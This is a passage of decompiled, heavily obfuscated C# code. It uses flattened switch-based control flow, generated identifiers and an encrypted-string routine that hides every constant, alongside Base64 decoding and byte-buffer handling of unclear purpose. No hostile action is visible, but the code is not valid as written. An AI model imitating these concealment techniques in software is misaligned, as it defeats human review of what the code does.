				uint num2;
				switch ((num2 = (uint)(num + 1041582581)) % 10) {
				case 7u:
					break;
				default:
					num = 735647560;
					continue;
				case 6u:
					return null;
				case 5u:
					goto IL_0065;
				case 1u:
					return null;
				case 9u:
					goto IL_00cf;
				case 3u:
					return null;
				case 8u:
					goto IL_00f9;
				case 2u:
					goto IL_0121;
				case 4u:
					return null;
				case 0u:
					return graph91.key6912 (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c95553580cfa0baa80d"));
				}
				break;
				IL_0121:
				num = ((Encoding.ASCII.GetString (array8361) == flag6144.0e291526dfde44109a60e580c474e7dd ("7890d06f7649f")) ? (-137921667) : (~-523731755));
				continue;
				IL_00cf:
				num = ((array8361.Length != 0) ? ((int)num2 - -278012562) : ((int)(0 - num2 + 1439016654)));
				continue;
				IL_0065:
				byte[] array8362 = new byte[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("687d031a6dfcbc5719e") + position5546.Length];
				array8362 [0] = (byte)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2e9f2b65617a40b4448");
				Buffer.BlockCopy (position5546, 0, array8362, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3c9a5a70e067f5e8a8c"), position5546.Length);
				num = (graph91.mode675 (array8362, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9c00fae2aa9bb88bcda")) ? (-357095101) : 744184922);
			}
			goto IL_0016;
			IL_00f9:
			array8361 = graph91.key6912 (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4a1e538ffd257b8569e"));
			num = ((array8361 == null) ? 981047555 : (-583613482));
			goto IL_001c;
		}

		private static byte[] input83 (string code40)
		{
			byte[] bytes = Encoding.Unicode.GetBytes (code40 + flag6144.0e291526dfde44109a60e580c474e7dd ("4ddf31409799f"));
			byte[] array8361 = default(byte[]);
			while (true) {
				int num = 848553838;
				while (true) {
					uint num2 = (uint)(num - 4920115);
					switch (num2 % 4) {
					case 2u:
						break;
					default:
						num = 848553838;
						continue;
					case 3u:
						array8361 = new byte[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2f9ff5e54ff3fc30666") + bytes.Length];
						num = (int)(~num2 + 2129842727);
						continue;
					case 0u:
						array8361 [0] = (byte)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c93081ed8dcaf053d0d");
						num = (int)(num2 - 1249960960);
						continue;
					case 1u:
						Buffer.BlockCopy (bytes, 0, array8361, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2e9fa9951382701e988"), bytes.Length);
						return array8361;
					}
					break;
				}
			}
		}

		private static string flag6137 (int code14, int score960, byte[] child07)
		{
			if (score960 != flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9f086279e59bf9fc8c0")) {
				goto IL_000d;
			}
			string text873 = status3039;
			goto IL_004a;
			IL_004a:
			string text874 = text873;
			int num = -2104874924;
			goto IL_0013;
			IL_000d:
			num = ~282774016;
			goto IL_0013;
			IL_0013:
			while (true) {
				uint num2 = (uint)(num ^ -265328524);
				switch (num2 % 5) {
				case 2u:
					break;
				default:
					num = -282774017;
					continue;
				case 3u:
					goto IL_003e;
				case 0u:
					goto IL_0052;
				case 4u:
					return string.Empty;
				case 1u: {
					string newValue = next60 (child07);
					return text874.Replace (flag6144.0e291526dfde44109a60e580c474e7dd ("be77a24329465cc91293ec799b071f45ffc"), code14.ToString ()).Replace (flag6144.0e291526dfde44109a60e580c474e7dd ("8cd74234d92489bb182908affde99eae6bde9"), newValue).Replace (flag6144.0e291526dfde44109a60e580c474e7dd ("d9996f266dd068556fbe6ac9a77ae2eda"), child07.Length.ToString ());
				}
				}
				break;
				IL_0052:
				num = (int)((!string.IsNullOrEmpty (text874)) ? (num2 + 698536787) : (num2 + 996917156));
			}
			goto IL_000d;
			IL_003e:
			text873 = time7295;
			goto IL_004a;
		}

		private static byte[] file2846 (byte[] start997, string size745)
		{
			byte[] array8361 = new byte[start997.Length];
			Buffer.BlockCopy (start997, 0, array8361, 0, start997.Length);
			int num = product18 (array8361, Encoding.Unicode.GetBytes (flag6144.0e291526dfde44109a60e580c474e7dd ("8f54b3ebbbcc612ebeb7b39e2f802c426d633fd54c6")));
			int num4 = default(int);
			int count = default(int);
			byte[] bytes = default(byte[]);
			while (true) {
				int num2 = ~-463291161;
				while (true) {
					uint num3 = (uint)(num2 - -866031491);
					switch (num3 % 10) {
					case 5u:
						break;
					default:
						num2 = 463291160;
						continue;
					case 8u:
						num2 = ((num4 < flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("aedff53d8a973538bd7")) ? 148408639 : (-717273777));
						continue;
					case 9u:
						num4 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0e99f823423b4b9770d");
						num2 = (int)(num3 - 1170777102);
						continue;
					case 1u:
						num2 = (int)((num < 0) ? (num3 - 1609458676) : (0 - num3 + 1519449913));
						continue;
					case 2u:
						count = Math.Min (bytes.Length, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("79085bb02d228d8aa9c"));
						num4 = 0;
						num2 = (int)num3 - -432268184;
						continue;
					case 7u:
						num2 = (int)(0 - num3) ^ -1216902880;
						continue;
					case 0u:
						array8361 [num + num4] = 0;
						num2 = 806763448;
						continue;
					case 6u:
						throw new InvalidOperationException ();
					case 3u:
						bytes = Encoding.Unicode.GetBytes (size745);
						num2 = -731691179;
						continue;
					case 4u:
						Buffer.BlockCopy (bytes, 0, array8361, num, count);
						return array8361;
					}
					break;
				}
			}
		}

		private static int product18 (byte[] end785, byte[] range0772)
		{
			int num = 0;
			bool flag6145 = default(bool);
			int num4 = default(int);
			while (true) {
				int num2 = ((num <= end785.Length - range0772.Length) ? 1186144197 : 226447343);
				while (true) {
					uint num3;
					switch ((num3 = (uint)(num2 - 96521854)) % 12) {
					case 0u:
						num2 = 1186144197;
						continue;
					default:
						num2 = 1186144197;
						continue;
					case 8u:
						num2 = ((!flag6145) ? 2103106984 : (--568899171));
						continue;
					case 7u:
						num2 = ((end785 [num + num4] == range0772 [num4]) ? (--614055415) : (--110413478));
						continue;
					case 4u:
						flag6145 = false;
						num2 = (int)(~num3 + 375122651);
						continue;
					case 5u:
						return num;
					case 9u:
						num4 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f97dccdea3e66cc50b1");
						num2 = 137993329;
						continue;
					case 6u:
						num += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f9754fdeeeea39b4ad");
						num2 = 1719822068;
						continue;
					case 10u:
						break;
					case 3u:
						num2 = ((num4 < range0772.Length) ? 133630457 : 361231026);
						continue;
					case 2u:
						num2 = (int)(~num3 + 1349751292);
						continue;
					case 11u:
						flag6145 = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("d90659bebe646");
						num4 = 0;
						num2 = ~-1308279817;
						continue;
					case 1u:
						return flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f9c8fc6a59af11aea8");
					}
					break;
				}
			}
		}

		private static string next60 (byte[] input85)
		{
			string text873 = string.Join (flag6144.0e291526dfde44109a60e580c474e7dd ("2c9decef461cd"), input85.Select ((byte end996) => string.Format (flag6144.0e291526dfde44109a60e580c474e7dd ("0c94a50e8e1bfd34e2aa7175a08"), end996)).ToArray ());
			return flag6144.0e291526dfde44109a60e580c474e7dd ("e99484fbd41ed7986fd175f213784a1b0") + text873 + flag6144.0e291526dfde44109a60e580c474e7dd ("f973ac3e08224");
		}

		static session20 ()
		{
			while (true) {
				int num = 1774557788;
				while (true) {
					uint num2 = (uint)(num + -1370024130);
					switch (num2 % 4) {
					case 0u:
						break;
					default:
						num = 1774557788;
						continue;
					case 2u:
						time7295 = string.Empty;
						num = (int)(num2 - 2143941117);
						continue;
					case 3u:
						range7260 = new byte[0];
						num = (int)(~num2) + -30481577;
						continue;
					case 1u:
						args402 = new byte[0];
						return;
					}
					break;
				}
			}
		}
	}
}
namespace start964
{
	public class total94
	{
		public static byte[] count861 (string tree514)
		{
			string text873 = options800.status333 (tree514, flag6144.0e291526dfde44109a60e580c474e7dd ("ad50a5e9e694898fa569b3f2d95f6a139ad14"));
			if (string.IsNullOrEmpty (text873)) {
				goto IL_0019;
			}
			goto IL_0071;
			IL_0019:
			int num = 437849386;
			goto IL_001e;
			IL_001e:
			byte[] array8361 = default(byte[]);
			while (true) {
				uint num2 = (uint)(num ^ 0x76045C27);
				switch (num2 % 6) {
				case 2u:
					break;
				default:
					num = 437849386;
					continue;
				case 5u:
					goto IL_004d;
				case 4u:
					goto IL_0071;
				case 3u:
					return null;
				case 0u:
					return null;
				case 1u:
					return array8361.Skip (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f95a2b5fdbf953f8055")).ToArray ();
				}
				break;
				IL_004d:
				num = ((array8361.Length > flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1e95b13fcb233f8b58e")) ? ((int)(num2 - 1633810205)) : ((int)(~num2) ^ -820211573));
			}
			goto IL_0019;
			IL_0071:
			array8361 = Convert.FromBase64String (text873);
			num = 318843464;
			goto IL_001e;
		}

		public static byte[] code190 (byte[] left03)
		{
			if (left03 != null) {
				byte[] array8361 = default(byte[]);
				while (true) {
					int num = ~1260689865;
					while (true) {
						uint num2;
						switch ((num2 = (uint)(num ^ -2128155502)) % 7) {
						case 5u:
							break;
						default:
							num = -1260689866;
							continue;
						case 1u:
							goto IL_003c;
						case 2u:
							return null;
						case 0u:
							goto end_IL_0003;
						case 3u:
							goto IL_0068;
						case 4u:
							goto IL_0084;
						case 6u:
							return array8361;
						}
						break;
						IL_0084:
						num = ((array8361.Length == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0d94d600fc03db9b38e")) ? ((int)(0 - num2) + -147896851) : ((int)(0 - num2) + -535794574));
						continue;
						IL_0068:
						array8361 = stack564.start642 (left03);
						num = ((array8361 != null) ? (-517568225) : (-2146433307));
						continue;
						IL_003c:
						num = ((left03.Length != 0) ? ((int)(~num2 ^ 0x1988037A)) : ((int)num2 + -1101501199));
					}
					continue;
					end_IL_0003:
					break;
				}
			}
			return null;
		}

		public static byte[] size17 (string position05)
		{
			byte[] array8361 = count861 (position05);
			while (true) {
				int num = --768339362;
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num + 925140403)) % 4) {
					case 2u:
						break;
					default:
						num = 768339362;
						continue;
					case 1u:
						num = ((array8361 != null) ? ((int)num2 ^ -1420939708) : ((int)(~num2 ^ 0x421CF25A)));
						continue;
					case 3u:
						return null;
					case 0u:
						return code190 (array8361);
					}
					break;
				}
			}
		}
	}
}
namespace score8794.product625
{
	internal static class mode8607
	{
		internal static readonly int[] status6406;

		static mode8607 ()
		{
			int[] array8361 = new int[128];
			array8361 [0] = -1;
			array8361 [1] = -1;
			array8361 [2] = -1;
			array8361 [3] = -1;
			array8361 [4] = -1;
			array8361 [5] = -1;
			array8361 [6] = -1;
			array8361 [7] = -1;
			array8361 [8] = -1;
			array8361 [9] = -1;
			array8361 [10] = -1;
			array8361 [11] = -1;
			array8361 [12] = -1;
			array8361 [13] = -1;
			array8361 [14] = -1;
			array8361 [15] = -1;
			array8361 [16] = -1;
			array8361 [17] = -1;
			array8361 [18] = -1;
			array8361 [19] = -1;
			array8361 [20] = -1;
			array8361 [21] = -1;
			array8361 [22] = -1;
			array8361 [23] = -1;
			array8361 [24] = -1;
			array8361 [25] = -1;
			array8361 [26] = -1;
			array8361 [27] = -1;
			array8361 [28] = -1;
			array8361 [29] = -1;
			array8361 [30] = -1;
			array8361 [31] = -1;
			array8361 [32] = -1;
			array8361 [33] = -1;
			array8361 [34] = -1;
			array8361 [35] = -1;
			array8361 [36] = -1;
			array8361 [37] = -1;
			array8361 [38] = -1;
			array8361 [39] = -1;
			array8361 [40] = -1;
			array8361 [41] = -1;
			array8361 [42] = -1;
			array8361 [43] = -1;
			array8361 [44] = -1;
			array8361 [45] = -1;
			array8361 [46] = -1;
			array8361 [47] = -1;
			array8361 [48] = -1;
			array8361 [49] = -1;
			array8361 [50] = -1;
			array8361 [51] = -1;
			array8361 [52] = -1;
			array8361 [53] = -1;
			array8361 [54] = -1;
			array8361 [55] = -1;
			array8361 [56] = -1;
			array8361 [57] = -1;
			array8361 [58] = -1;
			array8361 [59] = -1;
			array8361 [60] = -1;
			array8361 [61] = -1;
			array8361 [62] = -1;
			array8361 [63] = -1;
			array8361 [64] = -1;
			array8361 [65] = -1;
			array8361 [66] = -1;
			array8361 [67] = -1;
			array8361 [68] = -1;
			array8361 [69] = -1;
			array8361 [70] = -1;
			array8361 [71] = -1;
			array8361 [72] = -1;
			array8361 [73] = -1;
			array8361 [74] = -1;
			array8361 [75] = -1;
			array8361 [76] = -1;
			array8361 [77] = -1;
			array8361 [78] = -1;
			array8361 [79] = -1;
			array8361 [80] = -1;
			array8361 [81] = -1;
			array8361 [82] = -1;
			array8361 [83] = -1;
			array8361 [84] = -1;
			array8361 [85] = -1;
			array8361 [86] = -1;
			array8361 [87] = -1;
			array8361 [88] = -1;
			array8361 [89] = -1;
			array8361 [90] = -1;
			array8361 [91] = -1;
			array8361 [92] = -1;
			array8361 [93] = -1;
			array8361 [94] = -1;
			array8361 [95] = -1;
			array8361 [96] = -1;
			array8361 [97] = -1;
			array8361 [98] = -1;
			array8361 [99] = -1;
			array8361 [100] = -1;
			array8361 [101] = -1;
			array8361 [102] = -1;
			array8361 [103] = -1;
			array8361 [104] = -1;
			array8361 [105] = -1;
			array8361 [106] = -1;
			array8361 [107] = -1;
			array8361 [108] = -1;
			array8361 [109] = -1;
			array8361 [110] = -1;
			array8361 [111] = -1;
			array8361 [112] = -1;
			array8361 [113] = -1;
			array8361 [114] = -1;
			array8361 [115] = -1;
			array8361 [116] = -1;
			array8361 [117] = -1;
			array8361 [118] = -1;
			array8361 [119] = -1;
			array8361 [120] = -1;
			array8361 [121] = -1;
			array8361 [122] = -1;
			array8361 [123] = -1;
			array8361 [124] = -1;
			array8361 [125] = -1;
			array8361 [126] = -1;
			array8361 [127] = -1;
			array8361 [48] = 0;
			array8361 [49] = 1;
			array8361 [50] = 2;
			array8361 [51] = 3;
			array8361 [52] = 4;
			array8361 [53] = 5;
			array8361 [54] = 6;
			array8361 [55] = 7;
			array8361 [56] = 8;
			array8361 [57] = 9;
			array8361 [97] = 10;
			array8361 [98] = 11;
			array8361 [99] = 12;
			array8361 [100] = 13;
			array8361 [101] = 14;
			array8361 [102] = 15;
			status6406 = array8361;
		}

		internal static int sum37 (int P_0, int P_1, int P_2)
		{
			int num;
			switch (P_2) {
			default:
				num = 1868599428;
				goto IL_001b;
			case 1:
				break;
			case 0:
				goto IL_00d3;
			case 3:
				goto IL_00df;
			case 2:
				goto IL_012f;
				IL_001b:
				while (true) {
					uint num2 = (uint)(num - 7120747);
					switch (num2 % 15) {
					case 5u:
						break;
					default:
						num = 1868599428;
						continue;
					case 12u:
						goto IL_006f;
					case 8u:
						return P_0 >>> 1;
					case 14u:
						goto IL_0095;
					case 7u:
						return P_0 >>> 1;
					case 9u:
						goto end_IL_0001;
					case 3u:
						goto IL_00d3;
					case 2u:
						goto IL_00df;
					case 0u:
						num = --172955807;
						continue;
					case 13u:
						num = ~-64804605;
						continue;
					case 4u:
						return (P_1 >>> 1) + (P_0 >>> 1);
					case 10u:
						return (P_1 + 1 >>> 1) + (P_0 >>> 1);
					case 1u:
						goto IL_012f;
					case 11u:
						num = (int)(0 - num2) ^ -2003808394;
						continue;
					case 6u:
						return P_0;
					}
					break;
					IL_0095:
					num = (((P_0 & 1) != 0) ? ((int)(num2 - 139036869)) : ((int)num2 - -193834872));
					continue;
					IL_006f:
					num = (int)(((P_0 & 1) == 0) ? (num2 + 236607828) : (num2 ^ 0x32BE49D7));
				}
				goto default;
				IL_012f:
				num = --615896374;
				goto IL_001b;
				IL_00df:
				num = --1116614211;
				goto IL_001b;
				IL_00d3:
				num = ~-326733104;
				goto IL_001b;
				end_IL_0001:
				break;
			}
			return P_1 - 1 - P_0;
		}

		internal static byte[] limit5566 (string P_0)
		{
			if (P_0 == null) {
				goto IL_0006;
			}
			goto IL_01b8;
			IL_0006:
			int num = 1338444228;
			goto IL_000b;
			IL_000b:
			int num5 = default(int);
			int num6 = default(int);
			byte[] array8361 = default(byte[]);
			int num8 = default(int);
			int num7 = default(int);
			int num9 = default(int);
			int num3 = default(int);
			int num4 = default(int);
			int num10 = default(int);
			int length = default(int);
			while (true) {
				uint num2 = (uint)(-num + -948090939);
				switch (num2 % 20) {
				case 0u:
					break;
				default:
					num = 1338444228;
					continue;
				case 12u:
					goto IL_0076;
				case 13u:
					num5 = 0;
					num6 = 0;
					num = (int)(num2 + 1102818905);
					continue;
				case 17u:
					return array8361;
				case 2u:
					num8++;
					num = 1918044383;
					continue;
				case 9u:
					num = (int)(num2 + 1106814750);
					continue;
				case 14u:
					goto IL_00ef;
				case 15u:
					goto IL_0108;
				case 5u:
					num7 = (num7 << 4) | num9;
					num = (int)(num2 + 1448948002);
					continue;
				case 19u:
					num8 = 0;
					num = (int)(num2 + 1760117904);
					continue;
				case 11u:
					goto IL_015c;
				case 7u:
					goto IL_0184;
				case 1u:
					num7 = 0;
					num = (int)num2 + -597047557;
					continue;
				case 16u:
					goto IL_01b8;
				case 3u:
					array8361 [num6] = (byte)((num7 >>> num5) & 0xFF);
					num6++;
					num = (int)(num2 ^ 0x2EE593D0);
					continue;
				case 6u:
					goto IL_01e6;
				case 10u:
					num5 += 4;
					num = (int)(num2 + 141995983);
					continue;
				case 4u:
					goto IL_021f;
				case 8u:
					num3 = num4 >>> 1;
					array8361 = new byte[num3];
					num = (int)(0 - num2) ^ -368559896;
					continue;
				case 18u:
					return new byte[0];
				}
				break;
				IL_021f:
				num = ((num5 < 8) ? ((int)num2 + -424378289) : ((int)num2 ^ -174128678));
				continue;
				IL_0076:
				int index = sum37 (num8, num4, num10) + 1;
				num9 = status6406 [(uint)P_0 [index]];
				num = ((num9 >= 0) ? (~1786278603) : (-1179720417));
				continue;
				IL_0108:
				num9 = status6406 [(uint)P_0 [0]];
				num = ((num9 < 0) ? ((int)num2 - -2087298004) : ((int)(~num2) + -152770214));
				continue;
				IL_01e6:
				length = P_0.Length;
				num = (int)((length < 1) ? ((0 - num2) ^ 0x3EB86BD1) : (~num2 + 52524973));
				continue;
				IL_015c:
				num10 = num9 >>> 2;
				num4 = length - 1;
				num = (((num4 & 1) != 0) ? ((int)num2 + -1412348568) : ((int)(num2 ^ 0x779B7302)));
				continue;
				IL_00ef:
				num = ((num8 >= num4) ? (-1799400976) : (-1759404431));
				continue;
				IL_0184:
				num5 -= 8;
				num = ((num6 >= num3) ? ((int)num2 - -693546668) : ((int)(num2 ^ 0x42321A65)));
			}
			goto IL_0006;
			IL_01b8:
			num = ~-1318311572;
			goto IL_000b;
		}
	}
	internal static class text872
	{
		internal static readonly byte[] child259;

		static text872 ()
		{
			byte[] array8361 = new byte[256];
			int num = 0;
			while (true) {
				int num2 = --105567147;
				while (true) {
					uint num3 = (uint)(num2 - -949401380);
					switch (num3 % 7) {
					case 5u:
						break;
					default:
						num2 = 105567147;
						continue;
					case 4u:
						num2 = (int)(0 - num3) ^ -474361123;
						continue;
					case 0u:
						num2 = (int)((num < 256) ? (~num3 + 1588479058) : (num3 ^ 0x7F55D94E));
						continue;
					case 1u:
						num2 = -306634448;
						continue;
					case 3u:
						array8361 [num] = (byte)(("[\u0015¥0\u008d§\u0006&\u0019\u0086\u0097_-×\a¢##Q\u00a8\u009d{ª\u000ew\u0015bv|Ô°æ²ÊN\u00b8\u0006\u0096R@lÁ!Æ&ÁC=»pú\u009a\u0099â¦dM\u0090\u0013\u008b\u001e\u0010\f7\u0013BýW°Ùøç\u0093¥¾3\u0015%èu\u0016\u00908Zdn,éÀ\u0098È\\ZhWĀ\u0003LÓ0\u0095|\u0014JQ\u0002$ÞÕÂ\u0014\u001eW;<Ì\u0019k@\u009f¥Hm\u0084@\u0019mé\u0003L\u00b4\u009eáßaºwèø\u0093yÂO\u0014ÜíüAtY\u001f\b¬\u00a8\u001cA\u009cÊGF²:Ø_\u0093u°³£\u0091u=ä¦Ò\u0013\u008dy5E\rB\u001d|jÝs\u001beE\u0080O8TCó_\u0019\u00a8åø¿\u0013oP\u0006%1²\tëÔ\u008cô¥\u00115]q7»³Ā/\u009bn\fÔ\rä\u008c%\f\tUå:\u009a4E\u0017kZ\t.ÄE\u0080\u0082\u0092¾ú²+º1" [num] - 1) ^ ((num * 73 + 19) & 0xFF));
						num++;
						num2 = (int)num3 + -61354088;
						continue;
					case 2u:
						num2 = --670053478;
						continue;
					case 6u:
						child259 = array8361;
						return;
					}
					break;
				}
			}
		}

		internal static byte[] count128 (byte[] P_0)
		{
			if (P_0 == null) {
				goto IL_0006;
			}
			goto IL_0267;
			IL_0006:
			int num = 212956513;
			goto IL_000b;
			IL_000b:
			int num7 = default(int);
			int num9 = default(int);
			byte[] array8361 = default(byte[]);
			int num6 = default(int);
			int num11 = default(int);
			int num12 = default(int);
			int num13 = default(int);
			int num8 = default(int);
			int num3 = default(int);
			int num10 = default(int);
			int num5 = default(int);
			int num4 = default(int);
			while (true) {
				uint num2;
				switch ((num2 = (uint)(~num ^ -145720215)) % 32) {
				case 11u:
					break;
				default:
					num = 212956513;
					continue;
				case 16u:
					num = (int)(num2 ^ 0x57A5B621);
					continue;
				case 26u:
					goto IL_00b5;
				case 3u:
					num7 = (num8 ^ (num9 >>> 8)) & 0xFF;
					num = (int)(0 - num2) + -2129624178;
					continue;
				case 10u:
					num = 1820447929;
					continue;
				case 23u:
					num = (int)(~num2 + 1619753399);
					continue;
				case 19u:
					num8 = ((num8 >>> (((num9 & 7) + 3) & 7)) | (num8 << 8 - (((num9 & 7) + 3) & 7))) & 0xFF;
					num = (int)(num2 + 135536891);
					continue;
				case 15u:
					return array8361;
				case 30u:
					num = 393991909;
					continue;
				case 17u:
					num6 = ((P_0 [2] ^ 0x45) << 8) | num6;
					num = (int)(0 - num2) ^ -1234900369;
					continue;
				case 22u:
					num11 = P_0 [3] ^ (num6 & 0xFF) ^ 7;
					num11 = ((P_0 [4] ^ ((num6 >>> 8) & 0xFF) ^ 0xF) << 8) | num11;
					num12 = num13 - 5;
					array8361 = new byte[num12];
					num = (int)(0 - num2) ^ -1308224902;
					continue;
				case 21u:
					num8 = P_0 [num3 + 5];
					num9 = (((num6 * 89) ^ ((num3 + 1) * 113)) + num7 + 227) & 0xFFFF;
					num8 = child259 [num8];
					num = 1882907661;
					continue;
				case 31u:
					goto IL_01eb;
				case 7u:
					num = 1218711778;
					continue;
				case 25u:
					num = (int)(~num2) + -1918596583;
					continue;
				case 4u:
					num10 = ((num10 + num8 + (num3 + 1) * 137) ^ 0xE3) & 0xFFFF;
					num = (int)(num2 - 1503689839);
					continue;
				case 24u:
					goto IL_0247;
				case 8u:
					goto IL_0267;
				case 18u:
					num10 = 58592;
					num = (int)(~num2 + 1633280105);
					continue;
				case 0u:
					num3 = 0;
					num = (int)(~num2) ^ -979646698;
					continue;
				case 14u:
					num8 ^= (num9 >>> 8) & 0xFF;
					num = (int)(num2 + 757348760);
					continue;
				case 13u:
					num5 = P_0 [0] ^ 0xEB;
					num = (int)(~num2 + 2123908538);
					continue;
				case 27u:
					goto IL_02de;
				case 20u:
					array8361 [num3] = (byte)num8;
					num = (int)(~num2) + -1351656889;
					continue;
				case 1u:
					num8 ^= num9 & 0xFF;
					num = (int)(num2 ^ 0x779C8349);
					continue;
				case 28u:
					num8 = (num8 - ((num9 >>> 8) & 0xFF)) & 0xFF;
					num = 509505489;
					continue;
				case 2u:
					num8 = (num8 - (num9 & 0xFF)) & 0xFF;
					num = ~-408006057;
					continue;
				case 6u:
					num7 = (num6 ^ 0x4C) & 0xFF;
					num = (int)num2 + -1567027874;
					continue;
				case 12u:
					num4 = (num5 >>> 4) & 3;
					num6 = P_0 [1] ^ 0x5B;
					num = (int)(num2 + 1875362203);
					continue;
				case 29u:
					num3++;
					num = (int)num2 - -212013740;
					continue;
				case 5u:
					goto IL_03b2;
				case 9u:
					return new byte[0];
				}
				break;
				IL_03b2:
				num = ((num10 == num11) ? ((int)(num2 - 59906793)) : ((int)num2 - -895862826));
				continue;
				IL_00b5:
				num = (((num5 & 0xF) == 2) ? ((int)(0 - num2) ^ -510745604) : ((int)num2 - -1259030469));
				continue;
				IL_0247:
				num = (int)(((num4 & 1) == 0) ? (num2 + 504766162) : (~num2 + 1273469265));
				continue;
				IL_02de:
				num = (((num4 & 2) != 0) ? ((int)(0 - num2) ^ -536333038) : ((int)(num2 ^ 0x1EB3DB6F)));
				continue;
				IL_01eb:
				num = ((num3 >= num12) ? 211697459 : (~-1204008164));
			}
			goto IL_0006;
			IL_0267:
			num13 = P_0.Length;
			num = ((num13 < 5) ? (--1550615231) : 1818628059);
			goto IL_000b;
		}

		internal static byte[] product32 (string P_0)
		{
			if (P_0 == null) {
				goto IL_0003;
			}
			goto IL_005d;
			IL_0003:
			int num = --1953544936;
			goto IL_0009;
			IL_0009:
			byte[] result = default(byte[]);
			while (true) {
				uint num2;
				switch ((num2 = (uint)(num ^ 0x7DD8B2C9)) % 7) {
				case 5u:
					break;
				default:
					num = 1953544936;
					continue;
				case 4u:
					num = (int)(~num2 + 1522649172);
					continue;
				case 2u: {
					byte[] array8361 = mode8607.limit5566 (P_0);
					result = count128 (array8361);
					num = (int)(num2 ^ 0x410DCD71);
					continue;
				}
				case 0u:
					goto IL_005d;
				case 6u:
					return result;
				case 3u:
					num = 889245997;
					continue;
				case 1u:
					return new byte[0];
				}
				break;
			}
			goto IL_0003;
			IL_005d:
			num = 182935268;
			goto IL_0009;
		}
	}
	internal static class flag6144
	{
		internal static byte[] afc56a45054d43f79162e3afe08ecda2 (string P_0)
		{
			return text872.product32 (P_0);
		}

		internal static int 631f6992fbfc4546bc89cf4edede51a7 (string P_0)
		{
			return afc56a45054d43f79162e3afe08ecda2 (P_0) [0];
		}

		internal static string 0e291526dfde44109a60e580c474e7dd (string P_0)
		{
			return Encoding.UTF8.GetString (afc56a45054d43f79162e3afe08ecda2 (P_0));
		}

		internal static byte fd084e43cbed44518c63432f41e19486 (string P_0)
		{
			return (byte)631f6992fbfc4546bc89cf4edede51a7 (P_0);
		}

		internal static sbyte 6885333ca2294cd0a87a9f3daaefc910 (string P_0)
		{
			return (sbyte)631f6992fbfc4546bc89cf4edede51a7 (P_0);
		}

		internal static bool 09343d4890d2414f8aa92dc5c3eb3877 (string P_0)
		{
			return 631f6992fbfc4546bc89cf4edede51a7 (P_0) != 0;
		}

		internal static short fa21cba85974458aae5f21844e65e89a (string P_0)
		{
			return BitConverter.ToInt16 (afc56a45054d43f79162e3afe08ecda2 (P_0), 0);
		}

		internal static ushort df1511e183d74449890cb9f7b5b3b527 (string P_0)
		{
			return BitConverter.ToUInt16 (afc56a45054d43f79162e3afe08ecda2 (P_0), 0);
		}

		internal static uint d4c6797c3b454648b4042912e872f293 (string P_0)
		{
			return BitConverter.ToUInt32 (afc56a45054d43f79162e3afe08ecda2 (P_0), 0);
		}

		internal static ulong 0ec45684299e40e293ce412da8705a9e (string P_0)
		{
			return BitConverter.ToUInt64 (afc56a45054d43f79162e3afe08ecda2 (P_0), 0);
		}

		internal static int 27e75a99fcfc47a0b6d8ab9429cde8ad (string P_0)
		{
			return BitConverter.ToInt32 (afc56a45054d43f79162e3afe08ecda2 (P_0), 0);
		}

		internal static long a5572d1b20c542f7b801adb820e4ecef (string P_0)
		{
			return BitConverter.ToInt64 (afc56a45054d43f79162e3afe08ecda2 (P_0), 0);
		}

		internal static float 9eb36c9645aa43b7985df9d1fc2f9aa1 (string P_0)
		{
			return BitConverter.ToSingle (afc56a45054d43f79162e3afe08ecda2 (P_0), 0);
		}

		internal static double db323f5d3b94412383acfe35230a0b47 (string P_0)
		{
			return BitConverter.ToDouble (afc56a45054d43f79162e3afe08ecda2 (P_0), 0);
		}
	}
}
